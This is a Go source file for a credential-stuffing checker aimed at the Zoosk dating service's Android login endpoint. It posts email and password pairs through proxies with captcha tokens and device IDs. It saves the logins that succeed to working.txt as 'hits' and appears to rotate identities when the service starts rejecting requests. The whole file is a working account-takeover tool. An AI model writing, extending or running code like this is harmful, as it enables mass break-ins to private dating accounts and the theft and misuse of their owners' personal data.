package check

import (
	"checker/helper"
	"fmt"
	"log"
	"strings"

	"github.com/go-resty/resty/v2"
	"github.com/gosuri/uilive"
)

var Good int = 0
var Bad int = 0
var TotalAccs = 0
var Current = 0

func PostReq(email, pass, device_id, udid, hcap, proxy string, wr *uilive.Writer) (int, string) {
	client := resty.New()
	client.SetProxy(proxy)
	resp, _ := client.R().
		SetHeaders(map[string]string{
			"Content-Type":    "application/x-www-form-urlencoded",
			"Accept-encoding": "gzip, deflate",
			"Host":            "api-android.zoosk.com",
			"User-Agent":      helper.GlobalAgent,
		}).
		SetFormData(map[string]string{
			"login":          email,
			"password":       pass,
			"udid":           udid,
			"hCaptcha_Token": hcap,
		}).
		Post("https://api-android.zoosk.com/v4.0/api.php?rpc=login%2Fgeneral_v43&product=4&format=json&locale=en_US&z_device_id=" + device_id)
	return resp.StatusCode(), string(resp.Body())
}

func StartChecking(email, pass, device_id, udid, hcap, proxy string, wr *uilive.Writer) string {
	for {
		i, body := PostReq(email, pass, device_id, udid, hcap, proxy, wr)
		if i == 410 {
			helper.TotalGone += 1
			if helper.TotalGone > 34 {
				helper.ForceChange()
			}
		}
		if i == 200 {
			if strings.Contains(body, `{"response":{"type":"success",`) {
				helper.Write("working.txt", email+":"+pass)
				Good += 1
				Current += 1
				log.Println(email, "is valid")
			}
			if strings.Contains(body, `{"error":{"type":"ValidationException","code":"not_found","field":"password"`) {
				Current += 1
			}
			fmt.Fprintf(wr, "Processing (%d/%d), Hits - %d \n", Current, TotalAccs, Good)
			return "ok"
		}
	}
}
